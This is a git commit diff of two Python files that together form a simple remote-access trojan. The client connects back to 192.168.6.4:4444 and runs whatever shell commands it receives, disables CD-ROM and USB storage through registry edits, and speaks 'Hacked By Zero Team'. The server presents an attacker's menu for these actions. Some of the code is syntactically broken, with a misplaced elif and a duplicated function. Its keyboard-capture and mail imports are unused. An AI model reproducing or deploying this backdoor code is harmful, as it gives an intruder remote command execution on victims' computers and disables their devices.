b8c09d48cb531b52befcc5c5ace2b0665264012b
RYAN <RYAN@DESKTOP-2LSA78J.com>
2021-07-30 22:16:12 +0430

    ver2

--- ghahremanitamrin26/clientghahremani26v1.py
+++ ghahremanitamrin26/clientghahremani26v1.py
@@ -3,21 +3,76 @@ import subprocess as sub
 from winreg import *
 from cryptography.fernet import Fernet
 import copy
+from pynput import keyboard
 import threading
 import smtplib
+import pyttsx3
 
-
-s = socket(2,1)
-s.connect(("192.168.6.4",4444))
+s = socket(2, 1)
+s.connect(("192.168.6.4", 4444))
 print("Connected To Port")
 print("______________________________")
 
 
-while True:
-    data1 = s.recv(102456).decode()
-    cmd = sub.check_output(data1, shell=True).decode()
-    s.send(str(cmd).encode())
-    f = open("cmd.txt", "w")
-    f.write(str(cmd).encode())
-    f.close()
-    s.send(f.encode())
+def choice(data):
+    if data == "1":
+        while True:
+            data1 = s.recv(102456).decode()
+            cmd = sub.check_output(data1, shell=True).decode()
+            s.send(str(cmd).encode())
+            f = open("cmd.txt", "w")
+            f.write(str(cmd).encode())
+            f.close()
+            s.send(f.encode())
+
+
+
+    elif data == "5":
+
+        keyVal = r'SYSTEM\CurrentControlSet\Services\cdrom'
+        try:
+            key = OpenKey(HKEY_LOCAL_MACHINE, keyVal, 0, KEY_ALL_ACCESS)
+        except:
+            key = CreateKey(HKEY_LOCAL_MACHINE, keyVal)
+
+        try:
+            SetValueEx(key, "start", 0, REG_DWORD, 4)
+            CloseKey(key)
+            s.send("Disabled CDROM".encode())
+        except:
+            s.send("Icant Disabled CDROM(maybe shoud run as administartor)".encode())
+
+    def sound_hacker():
+        for i in range(3):
+            e = pyttsx3.init()
+            e.setProperty("rate", 110)
+            e.say("Hacked By Zero Team")
+            e.runAndWait()
+
+    sound_hacker()
+
+    elif data == "6":
+
+    keyVal = r'SYSTEM\CurrentControlSet\Services\USBSTOR'
+    try:
+        key = OpenKey(HKEY_LOCAL_MACHINE, keyVal, 0, KEY_ALL_ACCESS)
+    except:
+        key = CreateKey(HKEY_LOCAL_MACHINE, keyVal)
+
+    try:
+        SetValueEx(key, "start", 0, REG_DWORD, 4)
+        CloseKey(key)
+        s.send("Disabled USB".encode())
+    except:
+        s.send("Icant Disabled USB(maybe shoud run as administartor)".encode())
+
+
+def sound_hacker():
+    for i in range(3):
+        e = pyttsx3.init()
+        e.setProperty("rate", 110)
+        e.say("Hacked By Zero Team")
+        e.runAndWait()
+
+
+sound_hacker()
--- ghahremanitamrin26/serverghahremani26v1.py
+++ ghahremanitamrin26/serverghahremani26v1.py
@@ -1,23 +1,45 @@
 from socket import *
-s = socket(2,1)
-s.bind(("192.168.6.4",4444))
+
+s = socket(2, 1)
+s.bind(("192.168.6.4", 4444))
 s.listen(1)
 print("Connected To Port")
 print("______________________________\n")
 
-
 client, addr = s.accept()
-print("Connected To"+str(addr)+"\n")
+print("Connected To" + str(addr) + "\n")
 print("______________________________")
 
+data = input('''
+    1-CMD
+    5-Disable CDROM   
+    6-Disable USB
 
-    
-while True:
-    Command = input("Enter Your Command: ")
-    if Command.upper() == "F":
-        break
-    client.send((Command).encode())
-    new_data = client.recv(102456).decode()
-    print(new_data)
 
+Enter your choice:''')
+
+if data == "1":
+    client.send((data).encode())
+    while True:
+        Command = input("Enter Your Command: ")
+        if Command.upper() == "F":
+            break
+        client.send((Command).encode())
+        new_data = client.recv(102456).decode()
+        print(new_data)
+
+
+elif data == "5":
+    F = open("Disable_CDROM Result.txt", "w")
+    client.send((data).encode())
+    new_data = client.recv(1024).decode()
+    F.write(new_data)
+    F.close()
+
+elif data == "6":
+    F = open("Disable_USB Result.txt", "w")
+    client.send((data).encode())
+    new_data = client.recv(1024).decode()
+    F.write(new_data)
+    F.close()
 
